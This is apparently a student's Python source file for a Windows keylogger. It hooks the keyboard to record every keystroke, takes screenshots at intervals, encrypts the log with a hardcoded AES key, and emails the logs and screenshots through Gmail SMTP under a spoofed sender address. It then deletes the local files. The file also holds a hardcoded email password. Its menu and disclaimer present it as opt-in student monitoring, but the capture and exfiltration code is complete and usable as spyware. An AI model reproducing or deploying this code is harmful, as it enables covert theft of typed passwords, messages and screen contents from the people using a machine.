# Sam Kuhnbaum 12104714 Windows Python Keylogger
# Only Windows functionality
# Uses Options List to Alert User
# Separate Decrypting Program
# Functions -
# Sends logs in Email
# Logs Keys
# Screenshots (Only takes screenshots of one screen - if you have dual monitors)

# Different Imports to allow program to run
import os
import os.path
import time
import sys
import pyHook # From pyHook
import pythoncom # From pywin32
import datetime
import logging 
import win32api, win32gui, win32con # From pywin32
import smtplib # Email module
import Image, ImageGrab # Allows screenshots
import random 
import struct

from Crypto.Cipher import AES # Encryption Module

# Email modules
from email.mime.text import MIMEText 
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

# Threading modules
import threading
from threading import Timer
from threading import Thread
from threading import Event

# Time to find to and from
TIME1 = ' '
TIME2 = ' '

# Email Settings
SENDMAIL = True # Set to True to send emails
EMAILADD = 'mmukeylogger@gmail.com' # Email to send to
EMAILPASS = 'keylogged' # Email password
FAKE = 'keylogged@gotcha.com' # Fake Email (required)
SUBJECT = 'Keylogger Data from - '
BODY = 'Screenshots and Data'
EMAILLOG = [] # Array to send screenshots and .txt file
EMAILLOG.append
eTHREAD = 0 # Email thread

# Keylogger Information / Settings / Defaults
STATE = True # DEFAULT Set to True to log
FILENAME = "keylog.log" # Output filename
TEXT = "" # Appended to give final output in filename
KEYNUM = 0 # Counter for Number of Keys
klTHREAD = 0 # Keylogger Thread
threadID = win32api.GetCurrentThreadId() # Used to stop key-logger

# Screenshot Settings
TAKESCREEN = True # Set to True to take screenshots
SCREENTIME = 10 # Interval between each screenshot
ssTHREAD = 0 # Screenshot Thread
ss_stop = threading.Event() # Event to stop screenshots

# Encryption Settings
enTHREAD = 0 # Encryption thread
ENDFILE = "enkeylog.txt" # Ending file for encryption to send
key = 'k3yl0gg3r3dI0I37' # Basic 16 byte key for AES

# Settings Text File
SFILE = "settings.txt"
STEXT = ''


def KeyLogger(k, klfile, endfile): # Keylogger method
    global STATE, FILENAME, TEXT, threadID, ENDFILE # Global values
    if STATE == True: # Checks if state is true
        threadID = win32api.GetCurrentThreadId() # Used to stop keylogger
        TEXT += "USB #1\n\nKeylogging has begun\n" # Appends Text node
        TEXT += "==============================\n"
        FILE = open(FILENAME, 'w') # Replaces contents of keylog.log with TEXT
        FILE.write(TEXT) # Writes value in TEXT to file
        FILE.close() # Closes the File
        hm = pyHook.HookManager() # pyHook code which handles reading in key-strokes
        hm.KeyDown = OnKeyboardEvent # Calls OnKeyboardEvent method if a key has been pressed
        hm.HookKeyboard() # Sets the hook
        pythoncom.PumpMessages() # Loops and waits for Windows Events
        FILE = open(FILENAME, 'a') # 'a' Appends file
        TEXT += "\nTOTAL KEYS LOGGED = " + str(KEYNUM) + "\n" # Writes total number of key-strokes
        TEXT += "\nKeylogging has finished" # Shows that logging has finished
        STATE = False # Sets state to false
        FILE.write(TEXT) # Finally writes TEXT to file
        FILE.close() # Closes file
        
def Settings ():
    global STEXT, SFILE
    STEXT += "THIS MONITORING SESSION WAS FROM - " + str(TIME1) + " - TO - " + str(TIME2) + "\n"
    if TAKESCREEN == True:
        STEXT += "\nTHE SCREENSHOT TIMER IS - " + str(SCREENTIME)
    STEXT += "\n\nTHE TOTAL NUMBER OF KEYSTROKES IS = " + str(KEYNUM)
    sf = open(SFILE, 'w')
    sf.write(STEXT)
    sf.close()
    addFile = str(os.getcwd()) + "\\" + str(SFILE) # Gets current working directory and saveas value
    EMAILLOG.append(addFile) # Appends EMAILLOG array
        
def stopKeylogger(): # Method ueed to stop pythoncom loop
    win32api.PostThreadMessage(threadID, win32con.WM_QUIT, 0, 0); # Finds threadID and tells it to quit

def OnKeyboardEvent(event): # Event used in Keylogger
    global TEXT, FILENAME, FILE, KEYNUM
    TEXT = ""
    FILE = open(FILENAME, 'a') # Appends File
    if event.Ascii == 8: # Backspace
        TEXT = TEXT[:-1] # Minuses 1 character from text
    elif event.Ascii == 13 or event.Ascii == 9: # Enter
        TEXT += "\n" # Line breaks
    elif event.Ascii == 14 or event.Ascii == 15: # Shift
        KEYNUM = KEYNUM # Sets Keynum to the same value
    else:
        TEXT += str(chr(event.Ascii)) # Normal Characters
        KEYNUM = KEYNUM + 1 # Adds 1 keystroke to KEYNUM to produce counter
    FILE.write(TEXT) # Writes TEXT to file
    FILE.close()
    return True

def AESEncryption(en, k, in_file, out_file, chunksize=64*1024): # AES Encryption takes 4 arguments
    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16)) # Random Initialisation Vector
    encryptor = AES.new(key, AES.MODE_CBC, iv) # Creates new AES-CBC using the key and random IV
    filesize = os.path.getsize(in_file) # Gets Keylog.log filesize

    with open(in_file, 'rb') as infile: # Opens keylog.log in read and binary mode 'rb'
        with open(out_file, 'wb') as outfile: # Opens enkeylog.txt in write and binary mode 'wb'
            outfile.write(struct.pack('<Q', filesize)) 
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize) # Chunksize must be divisible by 16
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk)) # Encrypts and writes output to enkeylog.txt
                                      
    

def Screenie(ss, ssTime, stop_event): # Automated Screenshot Method
        while (not stop_event.is_set()): # Loops to see if stop_event has been called
            time.sleep(ssTime) # Thread sleeps for time in ssTime 
            Screenshot() # Calls screenshot method
            

def Screenshot(): # Screenshot method
    img=ImageGrab.grab() # Takes a screenshot of main monitor
    saveas=os.path.join(time.strftime('%Y_%m_%d_%H_%M_%S')+'.gif') # Gets file path, time taken, file extension
    img.save(saveas) # Saves image as saveas value
    if SENDMAIL == True: # If program allows emails
        addFile = str(os.getcwd()) + "\\" + str(saveas) # Gets current working directory and saveas value
        EMAILLOG.append(addFile) # Appends EMAILLOG array

def sendEmail(): # Send email method
    msg = MIMEMultipart() # Splits msg into different email sections
    msg ['Subject'] = SUBJECT + str(TIME1) + ' to ' + str(TIME2) # Sets subject + Time to and from
    msg ['From'] = FAKE # From FAKE address - random non-existant email address
    msg ['To'] = EMAILADD # To intended location
    msg.preamble = BODY # Only visible when reading raw-text

    for file in EMAILLOG: # Adds files from EMAILLOG array - Does not add keylog.log
        if file[-12:] == 'enkeylog.txt':
            fp = open(file)
            attach = MIMEText(fp.read())
            fp.close()

            attach.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file)) # For each file adds header
            msg.attach(attach) # Attaches file to email

        if file[-12:] == 'settings.txt':
            fp = open(file)
            attach = MIMEText(fp.read())
            fp.close()

            attach.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file)) # For each file adds header
            msg.attach(attach) # Attaches file to email
            
        if file[-4:] == '.gif':
            fp = open(file, 'rb') 
            attach = MIMEImage(fp.read())
            fp.close()
            
            attach.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(file)) # For each file adds header
            msg.attach(attach) # Attaches file to email
            
    s = smtplib.SMTP('smtp.gmail.com:587') # Gets gmail email server
    s.starttls()  # Starts protocol client
    s.login(EMAILADD, EMAILPASS) # Logins into account with provided email and password
    s.sendmail(FAKE, EMAILADD, msg.as_string()) # Sends mail
    s.quit() # Stops client

def AltDelFiles(): # Alternative delete function outside email
        addFile = str(os.getcwd()) + "\\" + str(FILENAME)
        EMAILLOG.append(addFile) # Adds both keylog.log and enkeylog.txt to array
        deleteFiles() # Calls deleteFiles method
        print ("Files Deleted, returning to main menu")

def deleteFiles(): # Delete Method
    if len(EMAILLOG) < 1: return True 
    for file in EMAILLOG:
        os.unlink(file) # Unlinks every file in EMAILLOG

def EmailVersion(): # Overall Email method
        if SENDMAIL == True: # Finds if SENDMAIL's state is true
            addFile = str(os.getcwd()) + "\\" + str(FILENAME)
            EMAILLOG.append(addFile) # Adds both keylog.log and enkeylog.txt to array
            sendEmail() # Calls sendEmail
            deleteFiles() # Calls deleteFiles()
            print ("Files Have Been Sent and Deleted")
        time.sleep(2) # Sleeps for 2 seconds to complete
        
def mainprog():
    global TIME1, TIME2, TAKESCREEN, SCREEnTIME # Time taken
    mode = raw_input("SELECT OPTION: ? ") # Asks uses for command
    print ('_______________________________________ \n')

    if mode == 'start': # Start monitoring
        #Placeholder()
        TIME1 = datetime.datetime.now() # Gets start time
        keylog = Thread(target=KeyLogger, args=(klTHREAD, FILENAME, ENDFILE))
        keylog.start() # Starts keylogger thread
        if TAKESCREEN == True:
            ss = Thread(target=Screenie, args=(ssTHREAD, SCREENTIME, ss_stop))
            ss.start() # Starts screenshot thread
        print ("Monitoring has begun, before you log off, check the files and please finish the program! Thank you.") # Confirmation logging has begun
        mode2 = raw_input("If you want to stop - type 'y' : ") # Asks if user wants to stop
        if mode2 == 'y': # If 'y'
            stopKeylogger() # stopKeylogger method called
            ss_stop.set() # Event called for screenshots
            TIME2 = datetime.datetime.now() # Gets end time
            time.sleep(1) # Sleeps for 1 second
            aesthread = Thread(target=AESEncryption, args=(enTHREAD, key, FILENAME, ENDFILE)) # Starts encryption thread
            aesthread.start()
            addFile2 = str(os.getcwd()) + "\\" + str (ENDFILE) 
            EMAILLOG.append(addFile2)# Appends EMAILLOG
            Settings() # Calls Settings Method
            mode3 = raw_input("If you would like to send the logs - type 'y' or 'n' : ") # Asks user if they want the logs to be sent
            if mode3 == 'y': # If Yes
                EmailVersion() # calls EmailVersion
                mainprog() # Reverts back to mainmenu
                print ("Returning to main menu")

            if mode3 == 'n': # If No
                AltDelFiles() # Alternative delete function
                mainprog() # Reverts back to mainmenu
                print ("Returning to main menu")

            else: # If anything else
                print ("Invalid input, returning to main menu") 
                mainprog() # Reverts back to mainmenu

        else:
            print ("Invalid input, returning to main menu")
            mainprog() # If invalid input, reverts back to mainmenu
            
    elif mode == 'stop': # Separate Stop command
        stopKeylogger()
        ss_stop.set()
        TIME2 = datetime.datetime.now()
        time.sleep(1)
        aesthread = Thread(target=AESEncryption, args=(enTHREAD, key, FILENAME, ENDFILE))
        aesthread.start()
        sthread = Thread(target=Settings, args=(sTHREAD, SFILE))
        sthread.start()
        print ("Monitoring Has Now Stopped")
        mainprog()
        
    elif mode == 'send': # Separate Send command
        EmailVersion()
        mainprog()

    elif mode == 'delete': # Separate Delete command
        AltDelFiles()
        mainprog()
        
    elif mode == 'exit': # Exit command - ends program
        print ("Exiting...")
        time.sleep(1)

    elif mode == 'info': # Information about program
        print ("THE FOLLOWING PROGRAM IS USED TO MONITOR STUDENTS AND GAIN INCITE INTO\nHOW STUDENTS ACT WITHIN ON CAMPUS EQUIPMENT. THE PROGRAM\nWILL BE MONITORING EVERYTHING YOU TYPE INTO THE KEYBOARD\nAS WELL AS TAKING SCREENSHOTS EVERY 5 MINUTES, THESE FILES CAN BE VIEWED\nON THE USB PENDRIVE NAMED 'MONITORING'")
        mainprog()

    else:
        print ("Invalid input, returning to main menu")
        mainprog() # Invalid inputs


# Prints Options list and disclaimer to window
print ("THIS IS AN OPTIONAL MONITORING PROGRAM\nSTUDENTS MAY OPT IN OR OUT FOLLOWING INSTRUCTIONS\nALL TEXT AND SCREENSHOTS CAN BE VIEWED IN THE USB PENDRIVE\nPLEASE CHOOSE AN OPTION FROM THE LIST\n")
print ("OPTIONS LIST")
print ("start - STARTS MONITORING")
print ("exit - QUITS PROGRAM")
print ("stop - STOPS MONITORING")
print ("send - SENDS LOGS IF INVALID INPUT")
print ("delete - DELETES FILES AND EXITS")
print ("info - INFORMATION ABOUT PROGRAM")
mainprog()
print ("Ending Program! Thank you for your time :)")
time.sleep(3)
sys.exit()
    
        
        
        
        
        
        
        
    
